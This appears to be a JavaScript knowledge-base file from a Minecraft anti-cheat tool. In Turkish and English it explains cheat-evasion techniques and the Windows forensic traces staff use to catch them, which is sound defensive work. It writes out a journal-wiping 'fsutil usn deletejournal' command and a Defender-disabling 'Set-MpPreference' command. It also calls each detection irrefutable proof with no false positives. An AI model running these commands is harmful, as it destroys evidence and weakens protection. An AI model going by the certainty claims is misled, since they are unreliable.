/**
 * Atlas AC - Cheat Knowledgebase & Staff / Admin Forensic Guidance Engine
 * Provides comprehensive, educational, and actionable explanations for every detection:
 * 1. Ne Anlama Gelir? (Taktik ve Metot Aciklamasi)
 * 2. Hileciler Neden ve Nasil Kullanir? (Hilenin Calisma Mantigi ve Atlatma Yontemi)
 * 3. Yetkili / Admin Ne Yapmali? (Eylem Plani, Ban Karari ve Kontrol Tavsiyesi)
 * 4. Neden Kesin Kanittir? (0 Hatali Pozitif Guvencesi)
 */

class CheatKnowledgeBase {
  constructor() {
    this.knowledge = {
      // 1. Ekran Paylasimi Gizleme (Window Display Affinity)
      WINDOW_CLOAKED_FROM_SCREENSHARE: {
        tr: {
          tacticName: 'Ekran Paylaşımından Gizleme (WDA_EXCLUDEFROMCAPTURE)',
          howItWorks: 'Drip Lite, Slinky, Vape ve özel harici ghost client menüleri, Windows API\'sini (SetWindowDisplayAffinity 0x11) çağırarak kendi pencerelerini Discord, AnyDesk, OBS veya Teams ekran paylaşımından gizlerler. Oyuncu ekranını yetkiliye açtığında yetkili hile menüsünü göremez; ancak oyuncunun kendi monitöründe hile GUI\'si aktif kalır.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): Meşru hiçbir oyun modu veya program ekran paylaşımından gizlenmez. Ekran paylaşımı gizlemesini ve hile olasılığını ban kurallarına göre değerlendiriniz.',
          whyConcrete: 'Win32 GetWindowDisplayAffinity fonksiyonu doğrudan pencereye atanmış 0x11 değerini doğrulamıştır. Sistem hatası veya tesadüf olması teknik olarak imkansızdır.'
        },
        en: {
          tacticName: 'Window Cloaking from Screenshare (WDA_EXCLUDEFROMCAPTURE)',
          howItWorks: 'Ghost clients invoke Windows API SetWindowDisplayAffinity(0x11) to render their GUI completely invisible during Discord, AnyDesk, OBS, or Teams screensharing while remaining visible to the player.',
          adminAction: 'Staff Review Guidance: Legitimate applications never set capture exclusion. The user intentionally hid active cheat overlays.',
          whyConcrete: 'Verified directly via user32 GetWindowDisplayAffinity returning 0x11 affinity flag.'
        }
      },

      // 2. Windows Test Modu (Testsigning Boot Mode)
      TESTSIGNING_BOOT_MODE_ENABLED: {
        tr: {
          tacticName: 'Windows Test Modu (TESTSIGNING ON - DSE Bypass)',
          howItWorks: 'Windows normalde yalnızca Microsoft tarafından imzalanmış sürücüleri yükler. Ring-0 çekirdek (kernel) hileleri oyunun ve anti-cheat\'in belleğine doğrudan çekirdekten müdahale eder. Hileciler bu imzasız hile sürücülerini yükleyebilmek için Windows\'u Test Modunda başlatırlar.',
          adminAction: 'Yetkili İncelemesi (BYPASS Değerlendirmesi): Normal bir Minecraft oyuncusunun Windows\'u TESTSIGNING modunda çalıştırması için geçerli hiçbir sebep yoktur. Çekirdek düzeyinde bypass tespiti ve sürücü müdahalesini inceleyiniz.',
          whyConcrete: 'Windows BCD ve SystemStartOptions doğrudan TESTSIGNING bayrağını doğrulamıştır.'
        },
        en: {
          tacticName: 'Windows Test Signing Boot Mode Enabled (DSE Bypass)',
          howItWorks: 'Allows arbitrary unsigned kernel drivers (ring-0 memory manipulators) to load into Windows, bypassing Driver Signature Enforcement.',
          adminAction: 'Staff Review Guidance: No legitimate gamer needs Test Signing enabled.',
          whyConcrete: 'Verified via HKLM SystemStartOptions and BCD boot configuration.'
        }
      },

      // 3. Savunmasiz Surucu (BYOVD)
      VULNERABLE_KERNEL_DRIVER: {
        tr: {
          tacticName: 'Savunmasız Çekirdek Sürücüsü İstismarı (BYOVD)',
          howItWorks: 'Hileciler, dijital imzalı ancak güvenlik açığı olan eski donanım sürücülerini (Capcom, RTCore64, GDrv) yüklerler. Bu açık sayesinde kullanıcı modundaki hile, Windows çekirdeğine doğrudan fiziksel bellek okuma/yazma yaptırır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Temp veya hile klasöründen yüklenen savunmasız sürücüler doğrudan ring-0 bellek hilesini kanıtlar.',
          whyConcrete: 'Yüklü sürücü adı ve yolu bilinen savunmasız BYOVD sürücü veritabanı ile eşleşmiştir.'
        },
        en: {
          tacticName: 'Bring Your Own Vulnerable Driver (BYOVD) Exploit',
          howItWorks: 'Abuses known vulnerable signed drivers to execute ring-0 physical memory manipulation from user space.',
          adminAction: 'Staff Review Guidance: Confirms kernel-level memory tampering.',
          whyConcrete: 'Matched against known BYOVD kernel driver database.'
        }
      },

      // 4. Spotify DLL Ele Gecirme (Spotify DLL Hijacking)
      SPOTIFY_DLL_HIJACK: {
        tr: {
          tacticName: 'Spotify Truva Atı ve DLL Ele Geçirme (Proxy DLL Hijack)',
          howItWorks: 'Hile geliştiricileri hile dosyasını açık bir exe olarak tutmaz. Spotify klasörüne version.dll veya winmm.dll adında sahte bir DLL koyarlar. Spotify açıldığında bu DLL\'i yükler ve Spotify süreci arkasından gizlice Minecraft\'a (javaw.exe) hileyi enjekte eder.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): Spotify\'ın orijinal kurulumunda bu DLL\'ler bulunmaz. Oyuncunun arkada müzik dinliyorum savunmasını ve ban gerekliliğini inceleyiniz.',
          whyConcrete: 'Spotify dizinindeki DLL meşru SpotX yamalarından ayrıştırılmış, hile enjeksiyon simgeleri ve kancaları doğrulanmıştır.'
        },
        en: {
          tacticName: 'Spotify DLL Hijacking & Trojan Bridge',
          howItWorks: 'Places a malicious proxy DLL (version.dll, winmm.dll) into Spotify directory. When Spotify runs, it automatically injects cheat code into javaw.exe.',
          adminAction: 'Staff Review Guidance: Real Spotify never ships these DLLs.',
          whyConcrete: 'Verified DLL location and injection tokens inside Spotify binary directory.'
        }
      },

      // 5. USN Degisiklik Gunlugu Silme (USN Wiping)
      USN_JOURNAL_DELETION_DETECTED: {
        tr: {
          tacticName: 'NTFS Değişiklik Günlüğü Karartma (USN Journal Wiped)',
          howItWorks: 'Windows NTFS, silinen her dosyanın adını ve silinme tarihini USN günlüğünde ($UsnJrnl) saklar. Hileciler kontrole çağrıldığında hileyi Shift+Delete ile silseler bile USN günlüğünde dosya adının kalacağını bildiklerinden, "fsutil usn deletejournal" komutuyla tüm günlüğü sıfırlarlar.',
          adminAction: 'Yetkili İncelemesi (KANIT KARARTMA ve BAN Değerlendirmesi): Ekran kontrolü öncesinde dosya silinme geçmişinin yok edilmesi kanıt karartma şüphesidir. Sistem açılış saatini inceleyerek ban durumunu değerlendiriniz.',
          whyConcrete: 'Windows NTFS USN Journal durum sorgulaması günlüğün aktif olarak sıfırlandığını kanıtlamıştır.'
        },
        en: {
          tacticName: 'NTFS USN Change Journal Wiped (Anti-Forensics)',
          howItWorks: 'The suspect executed fsutil usn deletejournal to destroy filesystem deletion traces and conceal deleted cheat binaries.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Verified active USN Journal deletion via low-level FSCTL query.'
        }
      },

      // 5B. USN Journal Wiping Anti-Forensics
      USN_JOURNAL_WIPED_ANTI_FORENSICS: {
        tr: {
          tacticName: 'NTFS USN Günlüğü Sıfırlama (Kanıt Karartma / Anti-Forensics)',
          howItWorks: 'Oyuncunun işletim sistemi saatlerce açık olmasına rağmen NTFS USN Change Journal boyutu veya kayıt sayısı anormal derecede küçüktür (< 512 KB). Bu durum, oyuncunun kontrol öncesinde "fsutil usn deletejournal /D C:" komutunu çalıştırarak tüm silinme ve dosya izlerini temizlediğini ve ardından günlüğü yeniden başlattığını kesin olarak gösterir.',
          adminAction: 'Yetkili İncelemesi (KANIT KARARTMA): USN günlüğünün kasten temizlenmesi doğrudan delil karartma eylemidir.',
          whyConcrete: 'Sistem çalışma süresi (uptime) ile USN kayıt boyutu arasındaki matematiksel tutarsızlık ve sıfırlanmış USN ID verisi somuttur.'
        },
        en: {
          tacticName: 'NTFS USN Change Journal Purged (Anti-Forensics Wiping)',
          howItWorks: 'The system has been running for an extended duration, yet the USN Change Journal contains anomalously few records (< 512 KB). This confirms the player wiped the journal using "fsutil usn deletejournal" prior to screenshare.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Mathematical mismatch between system uptime and Next USN counter, indicating recent manual purging.'
        }
      },

      // 5C. USN Journal Recreated During Session
      USN_JOURNAL_RECREATED_DURING_SESSION: {
        tr: {
          tacticName: 'Oturum Sırasında Yeniden Oluşturulan USN Günlüğü (Delil Karartma)',
          howItWorks: 'Windows NTFS $UsnJrnl dosyasının oluşturulma zaman damgası (CreationTime), bilgisayarın son açılış zamanından (LastBootUpTime) daha yenidir. Bu durum, oyuncunun bilgisayar açıkken ve oyun oynarken USN günlüğünü tamamen sildiğini ve ardından delil bırakmamak için sıfırdan yeni bir günlük başlattığını inkar edilemez biçimde kanıtlar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Oturum ortasında USN günlüğünün yeniden oluşturulması profesyonel hile temizleme yöntemidir.',
          whyConcrete: 'NTFS dosya sistemi oluşturulma saati > Sistem boot saati. Bu matematiksel kronolojik kanıt manipüle edilemez.'
        },
        en: {
          tacticName: 'USN Journal Recreated During Active User Session',
          howItWorks: 'The NTFS $UsnJrnl creation timestamp is newer than Windows LastBootUpTime. This proves the journal was deleted and recreated while the machine was running to wipe cheat execution trails.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'File creation timestamp strictly exceeds system boot time, providing irrefutable chronological proof.'
        }
      },

      // 5D. USN Journal Carved Deleted Cheat Record
      USN_JOURNAL_DELETED_CHEAT: {
        tr: {
          tacticName: 'NTFS USN Günlüğünden Kurtarılan Silinmiş Hile Kaydı',
          howItWorks: 'Hileci, hile dosyasını (JAR, EXE, DLL veya .bplus) Shift+Delete ile silse veya kendini imha eden (self-destruct) bir betik kullansa dahi, Windows NTFS çekirdeği silinen her dosyanın adını, silinme anını ve 0x00000002 (FILE_DELETE) işlem kodunu USN Journal ($J) içinde saklar. Atlas AC, bu düşük seviyeli günlükten silinen dosyanın tam adını ve silinme saniyesini kurtarmıştır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Silinen dosyanın adı, tam silinme zaman damgası ve USN işlem numarası sabittir. Masumiyet iddiaları geçersizdir.',
          whyConcrete: 'NTFS çekirdek düzeyinde 64-bit USN işlem kaydı ve FILE_DELETE sebebi somuttur.'
        },
        en: {
          tacticName: 'Carved Deleted Cheat Record in NTFS USN Journal',
          howItWorks: 'Even if the cheat binary was shift-deleted or wiped with self-destruct scripts, NTFS logs the file deletion with reason USN_REASON_FILE_DELETE (0x00000002) in $UsnJrnl:$J. Atlas AC extracted the exact deletion record.',
          adminAction: 'Staff Review Guidance: File name, exact deletion timestamp, and USN operation ID are conclusive.',
          whyConcrete: 'Kernel-level NTFS USN Journal record with explicit FILE_DELETE operation code.'
        }
      },

      // 5E. USN Journal Deletion Command Executed in Shell
      USN_JOURNAL_DELETE_COMMAND_DETECTED: {
        tr: {
          tacticName: 'USN Günlüğü Silme Komutu Geçmişi (fsutil usn deletejournal)',
          howItWorks: 'Oyuncunun PowerShell komut geçmişinde (ConsoleHost_history) veya Windows PowerShell Event ID 4104 günlüklerinde "fsutil usn deletejournal" komutunu çalıştırdığı tespit edilmiştir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Oyuncunun doğrudan komut satırından delil karartma komutları girdiği sabittir.',
          whyConcrete: 'Konsol geçmişi ve PowerShell ScriptBlock AST günlüklerindeki doğrudan komut kaydı somuttur.'
        },
        en: {
          tacticName: 'USN Journal Deletion Command Executed in Shell',
          howItWorks: 'Player executed "fsutil usn deletejournal" in PowerShell or command prompt as recorded in shell history or Event ID 4104 logs.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Concrete shell command record and PowerShell ScriptBlock audit logs.'
        }
      },

      // 6. RecentApps / BAM Silinmis Hile Kaydi
      RECENTAPPS_CHEAT_EXECUTION_RECORD: {
        tr: {
          tacticName: 'Silinmiş Hile Çalıştırma İzi (Windows RecentApps)',
          howItWorks: 'Oyuncu hileyi çalıştırmış, oyununu oynamış ve kontrole çağrılmadan önce hile dosyasını silmiştir. "Bilgisayarımda hile yok" savunmasını yapar. Ancak Windows Search RecentApps mekanizması dosyanın çalıştırıldığı tam tarihi, kaç kez açıldığını ve orijinal yolunu adli olarak saklamıştır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Hilenin bu bilgisayarda çalıştırıldığı ve sonradan delil karartmak amacıyla silindiği kesinleşmiştir.',
          whyConcrete: 'Windows Registry RecentApps içindeki 64-bit FILETIME zaman damgası ve dosyanın diskte olmaması (!fs.existsSync) ile kanıtlanmıştır.'
        },
        en: {
          tacticName: 'Deleted Cheat Execution Trace (Windows RecentApps)',
          howItWorks: 'The suspect launched the cheat and deleted the binary prior to inspection. Windows RecentApps retained the execution timestamp and launch count.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Decoded 64-bit FILETIME access timestamp and verified deleted file status on disk.'
        }
      },

      // 7. Resource Pack Icine Gizlenmis Bytecode
      RESOURCEPACK_HIDDEN_JAVA_CLASSES: {
        tr: {
          tacticName: 'Resource Pack Kılığına Sokulmuş Hile Baytkodu',
          howItWorks: 'Yetkililer genelde sadece .minecraft/mods klasörüne bakar. Hileciler hile JAR dosyasını .zip yaparak resourcepacks içine atarlar. Doku paketi gibi görünür ama içinde hile kodları (.class) çalışır. Meşru bir doku paketi ASLA Java .class kodu içermez.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): Doku paketinde Java sınıfı bulunması gizleme taktiğidir. Arşiv içeriğini ve ban gerekliliğini değerlendiriniz.',
          whyConcrete: 'Resource pack ZIP arşivi içinde Java .class baytkodları tespit edilmiştir.'
        },
        en: {
          tacticName: 'Disguised Java Bytecode in Resource Pack',
          howItWorks: 'Renames a cheat mod JAR to .zip and places it in resourcepacks to evade mod folder inspection. Real resource packs NEVER contain .class bytecode.',
          adminAction: 'Staff Review Guidance: 100% intentional concealment of cheat mod.',
          whyConcrete: 'Detected compiled Java class bytecode entries inside resource pack archive.'
        }
      },

      // 8. Minecraft Font Cokertme Istismari (Crash Client)
      MINECRAFT_FONT_CIRCULAR_CRASH_EXPLOIT: {
        tr: {
          tacticName: 'Özyinelemeli Font Çökertme İstismarı (Crash Exploit)',
          howItWorks: 'Font JSON tanımında kendine referans veren özyinelemeli (circular reference) sağlayıcılar kullanılır. Bu fontu kullanan bir oyuncunun nametag\'i veya mesajı ekranda göründüğünde, izleyen yetkilinin veya karşı oyuncunun oyunu sonsuz döngüye girerek (StackOverflowError) anında çöker.',
          adminAction: 'Yetkili İncelemesi (EXPLOIT Değerlendirmesi): Oyuncu sunucudaki yetkilileri veya rakipleri oyundan düşürmek amacıyla kasten çökertme hilesi (exploit) barındırmaktadır.',
          whyConcrete: 'Font JSON tanımındaki provider ID\'sinin kendine referans verdiği kanıtlanmıştır.'
        },
        en: {
          tacticName: 'Recursive Font Crash Exploit (Crash Client)',
          howItWorks: 'Uses self-referential circular font providers to trigger JVM StackOverflowError and crash spectator/opponent clients.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Font JSON provider reference points circularly to its own ID.'
        }
      },

      // 9. CryptnetUrlCache Hile Alani
      CRYPTNET_URLCACHE_CHEAT_DOMAIN_FOUND: {
        tr: {
          tacticName: 'Windows Sertifika Önbelleğinde Hile İzi (CryptnetUrlCache)',
          howItWorks: 'Oyuncu dijital imzalı bir hile loader\'ı (vape, drip, slinky) indirdiğinde veya açtığında, Windows CryptoAPI hilenin sertifikasını internetten doğrular ve sonucu CryptnetUrlCache içine yazar. Oyuncu hileyi silse bile Windows\'un bu derin adli önbelleğini silemez.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Oyuncunun bilgisayarında hile yazılımının çalıştırıldığı Windows tarafından resmi olarak önbelleğe alınmıştır.',
          whyConcrete: 'CryptnetUrlCache MetaData ikili verisinden çıkarılan doğrulanmış URL doğrudan hile alan adını içermektedir.'
        },
        en: {
          tacticName: 'Cheat Domain Verification Trace in CryptnetUrlCache',
          howItWorks: 'Windows CryptoAPI caches Authenticode certificate validation URLs whenever signed executables run. Suspects rarely clean this cache.',
          adminAction: 'Staff Review Guidance: Proves cheat binary was executed on this machine.',
          whyConcrete: 'Extracted cached URL matches confirmed cheat domain signature.'
        }
      },

      // 10. Minecraft Cokmesi ve Enjekte Modul
      JAVAW_INJECTED_MODULE_CRASH: {
        tr: {
          tacticName: 'Minecraft Sürecinde Enjekte DLL Çökmesi',
          howItWorks: 'Harici hileler (Vape, Drip vb.) DLL dosyasını Temp klasörüne çıkartıp oradan javaw.exe içine enjekte ederler. Hile kodunda hata olduğunda veya oyunla uyumsuzluk çıktığında, bu harici DLL Minecraft\'ı çökertir ve Windows Olay Günlüğü\'ne kalıcı olarak yazılır.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): Minecraft sürecinin Temp dizinindeki harici bir DLL yüzünden çökmüş olması enjeksiyon şüphesidir. Dosya yolunu inceleyerek ban kararını veriniz.',
          whyConcrete: 'Windows Application Log Event ID 1000 üzerinde Faulting application: javaw.exe ve Faulting module yolu somut olarak kaydedilmiştir.'
        },
        en: {
          tacticName: 'Injected DLL Crash Inside Minecraft (Event ID 1000)',
          howItWorks: 'External ghost clients extract and inject DLLs from Temp into javaw.exe. Faulty cheat code crashes Minecraft, creating permanent Event ID 1000 crash records.',
          adminAction: 'Staff Review Guidance: Irrefutable proof of external DLL injection.',
          whyConcrete: 'Event ID 1000 explicitly records javaw.exe crashing inside an untrusted/temp DLL.'
        }
      },

      // 11. Minecraft Oturum Gunlugu Hile Satiri
      MINECRAFT_LOG_CHEAT_EXECUTION: {
        tr: {
          tacticName: 'Minecraft Oturum Günlüğünde Hile İzi (Session Log)',
          howItWorks: 'Oyuncular hile modunu diskten silseler bile .minecraft/logs klasörünü temizlemeyi unuturlar. Hile istemcisi oyuna yüklendiğinde konsola versiyonunu ve modüllerini yazar. Bu kayıtlar oyun oturumu boyunca kalıcıdır.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): Log dosyasındaki zaman damgası oyuncunun sunucuda aktif olduğu saatlerle eşleşiyorsa hileyi kullandığı tespitini ve ban kararını değerlendiriniz.',
          whyConcrete: 'Günlük dosyasındaki satır numarası ve birebir kaydedilen başlatma metni ile somut kanıt sunulmuştur.'
        },
        en: {
          tacticName: 'Cheat Startup Banner in Minecraft Session Log',
          howItWorks: 'Suspects delete cheat JARs but forget to wipe logs/latest.log or .log.gz. Cheat initialization messages remain permanently logged.',
          adminAction: 'Staff Review Guidance: Directly confirms cheat was loaded into Minecraft.',
          whyConcrete: 'Exact log line, timestamp, and line number extracted from session log.'
        }
      },

      // 12. Hile Sitesine Girilmis ve Dosya Indirilmis
      VISITED_AND_DOWNLOADED_CHEAT: {
        tr: {
          tacticName: 'Hile Sitesi Ziyareti ve Doğrudan İndirme Korelasyonu',
          howItWorks: 'Oyuncu hile sitesine doğrudan adres çubuğuna yazarak (TYPED) girmiş ve aynı oturumda hile dosyasını bilgisayarına indirmiştir. "Ben girmedim, haberim yok" savunmasını tamamen çürütür.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Doğrudan hile temin etme ve kurma eylemidir.',
          whyConcrete: 'Tarayıcı geçmişindeki TYPED geçiş türü ile indirilen dosyanın hash ve dosya adı birebir eşleşmiştir.'
        },
        en: {
          tacticName: 'Visited Cheat Domain & Downloaded Payload Correlation',
          howItWorks: 'Correlates direct address bar navigation (TYPED transition) with downloaded cheat binaries, eliminating "accidental click" excuses.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Cryptographic correlation between browser transition and downloaded file path.'
        }
      },

      // 13. Raven B+ Serisi (KeystrokesMod Kiliginda)
      RAVEN_B_SERIES: {
        tr: {
          tacticName: 'KeystrokesMod Kılığında Raven B+ Ghost Client',
          howItWorks: 'Raven B+, meşru Keystrokes modunun içine Reach (mesafe uzatma), Velocity (geri tepmeme), AutoClicker ve AimAssist gizler. Oyuncu ekranda tuşları gösteriyorum derken arka planda rakiplere 3.5 bloktan vurur ve sıfır knockback alır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Orijinal Keystrokes modunda sadece render/tuş sınıfları bulunur; Reach, Velocity veya AutoClicker bulunması %100 hiledir.',
          whyConcrete: 'JAR içindeki dövüş (combat) paketleri ve Reach/Velocity baytkod sınıfları tam kanıtıyla yakalanmıştır.'
        },
        en: {
          tacticName: 'Raven B+ Ghost Client Disguised as KeystrokesMod',
          howItWorks: 'Conceals Reach, Velocity, and AutoClicker inside a modified KeystrokesMod. Players pretend to only display key presses while using combat hacks.',
          adminAction: 'Staff Review Guidance: Genuine KeystrokesMod only contains key render classes.',
          whyConcrete: 'Identified combat classes (Reach.class, Velocity.class) inside the package.'
        }
      },

      // 14. BAM / DAM / ShimCache / PCA - Execution Forensics
      BAM_CHEAT_RECORD: {
        tr: {
          tacticName: 'BAM (Background Activity Moderator) Hile Çalıştırma Kaydı',
          howItWorks: 'Windows BAM servisi, her kullanıcının arka planda çalıştırdığı uygulamaların tam yolunu ve 64-bit FILETIME zaman damgasını HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings altına yazar. Oyuncu hileyi diskten silse bile BAM kaydı sistem yeniden başlatılana kadar registry\'de kalır.',
          adminAction: 'Yetkili İncelemesi (BAN Değerlendirmesi): BAM kaydındaki FILETIME zaman damgası hilenin ne zaman çalıştırıldığını gösterir. Silinme geçmişini ve ban kararını inceleyiniz.',
          whyConcrete: 'Windows çekirdeği tarafından doğrudan yazılan HKLM registry FILETIME zaman damgası kullanıcı tarafından silinemez ve manipüle edilemez.'
        },
        en: {
          tacticName: 'BAM (Background Activity Moderator) Cheat Execution Record',
          howItWorks: 'Windows BAM service records every executable path and 64-bit FILETIME timestamp under HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State. Even after deletion, records persist until next reboot.',
          adminAction: 'Staff Review Guidance: The FILETIME proves exact execution time to millisecond precision. Missing file on disk = deliberate evidence destruction.',
          whyConcrete: 'Kernel-written HKLM registry FILETIME cannot be manipulated by user-space processes.'
        }
      },

      SHIMCACHE_EXECUTED_CHEAT: {
        tr: {
          tacticName: 'AppCompatCache / ShimCache Hile Çalıştırma İzi',
          howItWorks: 'Windows AppCompatCache (ShimCache), çalıştırılan her PE dosyasının tam yolunu, son değiştirilme tarihini ve bazen SHA256 hash değerini HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\\AppCompatCache altında saklar. Bu kayıt sistem yeniden başlatılana kadar registry\'de kalır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: ShimCache kaydı, hile EXE/JAR dosyasının hash ve yolunu içeriyor. Dosya diskten silinmiş olsa bile çalıştırma kanıtlanmıştır.',
          whyConcrete: 'HKLM sistem düzeyindeki ShimCache kaydı yalnızca sistem yeniden başlatılarak temizlenir; standart kullanıcı erişimiyle değiştirilemez.'
        },
        en: {
          tacticName: 'AppCompatCache/ShimCache Cheat Execution Trace',
          howItWorks: 'Windows ShimCache records path, last-modified time, and hash of every executed PE under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache.',
          adminAction: 'Staff Review Guidance: Proves execution even after file deletion.',
          whyConcrete: 'HKLM-level ShimCache is only cleared on system reboot.'
        }
      },

      PCA_EXECUTED_CHEAT: {
        tr: {
          tacticName: 'Windows Program Uyumluluk Yardımcısı (PCA) Hile Kaydı',
          howItWorks: 'Program Compatibility Assistant, uyumlu olmayan veya Windows tarafından tanımlanmamış yürütülebilir dosyaları çalıştırıldıktan sonra kayıt altına alır. Bu kayıtlar HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store altında saklanır ve hile yazılımlarının çalıştırılma zamanını ve yolunu içerir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: PCA kaydındaki tam yol ve zaman damgası hilenin bu bilgisayarda açıldığını kanıtlar.',
          whyConcrete: 'PCA kayıtları Windows uyumluluk altyapısı tarafından otomatik oluşturulur, kullanıcı tarafından kolayca silinmez.'
        },
        en: {
          tacticName: 'Program Compatibility Assistant (PCA) Cheat Execution Record',
          howItWorks: 'Windows PCA logs unrecognized executables under HKCU AppCompatFlags\\Compatibility Assistant\\Store with full path and timestamp.',
          adminAction: 'Staff Review Guidance: PCA record proves the cheat binary was launched on this PC.',
          whyConcrete: 'Automatically created by Windows compatibility infrastructure.'
        }
      },

      MUICACHE_CHEAT_RECORD: {
        tr: {
          tacticName: 'MUICache Hile Yürütme Kaydı (Yeniden Adlandırılmış Hile Tespiti)',
          howItWorks: 'Windows Explorer, her çalıştırılan EXE dosyasının ürün adını (Product Name) ve versiyon bilgisini MUICache registry anahtarında saklar (HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache). Oyuncu hile dosyasını "Minecraft.exe" veya "Java.exe" olarak yeniden adlandırsa bile MUICache gerçek ürün adını saklar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: MUICache, yeniden adlandırılmış hileler için de gerçek kimliği ortaya koyar.',
          whyConcrete: 'Windows kabuk tarafından her Explorer çalıştırmasında ürün adı doğrudan PE kaynağından okunarak kayıt edilir.'
        },
        en: {
          tacticName: 'MUICache Cheat Execution Record (Renamed Cheat Detection)',
          howItWorks: 'Windows Explorer stores the Product Name of every launched EXE in MUICache. Even renamed cheats reveal their true identity.',
          adminAction: 'Staff Review Guidance: MUICache reveals true cheat identity even when renamed.',
          whyConcrete: 'Product name is read directly from PE resources by Windows shell on every launch.'
        }
      },

      USERASSIST_CHEAT_RECORD: {
        tr: {
          tacticName: 'UserAssist Hile Çalıştırma İzi (ROT-13 Şifreli)',
          howItWorks: 'Windows Explorer, grafik arayüzden başlatılan her uygulamanın yolunu ROT-13 kodlamasıyla HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist altına yazar. Bu kayıt, hilenin kaç kez çalıştırıldığını ve son çalıştırma tarihini içerir. Oyuncu hileyi silmiş olsa bile UserAssist kaydı silinmeden kalır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: UserAssist kayıtları, dosya silme işleminden etkilenmez. Son çalıştırma zamanı ve çalıştırma sayısı kesin kanıttır.',
          whyConcrete: 'HKCU\\UserAssist altındaki kayıtlar Windows Explorer tarafından otomatik tutulur, çalıştırma sayısı ve FILETIME doğrulanmıştır.'
        },
        en: {
          tacticName: 'UserAssist ROT-13 Encoded Cheat Execution Trace',
          howItWorks: 'Windows Explorer records GUI-launched applications with ROT-13 encoding under HKCU\\UserAssist, including run count and last-run FILETIME.',
          adminAction: 'Staff Review Guidance: Unaffected by file deletion. Launch count and timestamp are concrete proof.',
          whyConcrete: 'Automatically maintained by Windows Explorer; FILETIME and run count verified.'
        }
      },

      // 15. Defender Forensics
      DEFENDER_CHEAT_THREAT_DETECTED: {
        tr: {
          tacticName: 'Windows Defender Hile Tespiti (MpDetectionHistory)',
          howItWorks: 'Windows Defender, tespit ettiği hile dosyasını MpDetectionHistory kayıtlarına ve Windows Event Log\'a (Microsoft-Windows-Windows Defender/Operational, Event ID 1116) yazar. Oyuncu izin verse veya karantinaya alsın, tespit kaydı kalıcı olarak sistemde saklanır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Windows Defender\'ın hileyi tanıması ve kayıt altına alması, hile binary\'inin bu bilgisayarda kesinlikle bulunduğunu kanıtlar.',
          whyConcrete: 'Windows Defender\'ın resmi event log kaydı, hile dosya adı, SHA256 hash ve tespit zamanını içerir. Değiştirilemez sistem kaydı.'
        },
        en: {
          tacticName: 'Windows Defender Cheat Detection (Threat History)',
          howItWorks: 'Windows Defender logs detected cheats to MpDetectionHistory and Event ID 1116, including file path, SHA256 hash, and detection time.',
          adminAction: 'Staff Review Guidance: Defender detection proves the cheat binary was present on this machine.',
          whyConcrete: 'Immutable Windows event log entry with file path, hash, and detection timestamp.'
        }
      },

      DEFENDER_REALTIME_PROTECTION_DISABLED: {
        tr: {
          tacticName: 'Windows Defender Gerçek Zamanlı Koruması Devre Dışı Bırakıldı',
          howItWorks: 'Oyuncu, hileyi indirmeden veya çalıştırmadan önce Windows Defender\'ın gerçek zamanlı korumasını kasıtlı olarak devre dışı bırakmıştır. Bu, "Set-MpPreference -DisableRealtimeMonitoring $true" veya registry manipülasyonu ile yapılır ve hile binary\'inin AV tarafından bloke edilmeden yüklenmesini sağlar.',
          adminAction: 'ŞÜPHELİ DURUM — Diğer bulguları da değerlendirin. Defender\'ın kapatılması tek başına kural ihlali sayılmaz, ancak diğer adli kanıtlarla birlikte değerlendirilmelidir.',
          whyConcrete: 'HKLM\\SOFTWARE\\Policies veya HKLM\\SOFTWARE\\Microsoft\\Windows Defender registry değerinden alınan devre dışı bırakma kaydı.'
        },
        en: {
          tacticName: 'Windows Defender Real-Time Protection Disabled',
          howItWorks: 'Player intentionally disabled Defender before running cheat. This allows cheat binary to load without AV blocking.',
          adminAction: 'SUSPICIOUS — Evaluate in context of other findings. Alone it is not a bannable offense.',
          whyConcrete: 'Registry-confirmed disablement under HKLM\\SOFTWARE\\Microsoft\\Windows Defender.'
        }
      },

      DEFENDER_CHEAT_EXCLUSION_PATH: {
        tr: {
          tacticName: 'Windows Defender Hile Klasörü İstisnası (Exclusion Path)',
          howItWorks: 'Oyuncu, hile dosyasının bulunduğu klasörü (genellikle %AppData%\\vape, %temp%\\drip, veya %AppData%\\.minecraft\\mods) Windows Defender istisna listesine eklemiştir. Bu, hilenin Defender tarafından taranmamasını sağlar ve kasıtlı hile kurulumunun doğrudan kanıtıdır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Hile klasörü için Defender istisnası eklenmesi, oyuncunun hileyi bilinçli olarak kurduğunu ve koruma altına aldığını kanıtlar.',
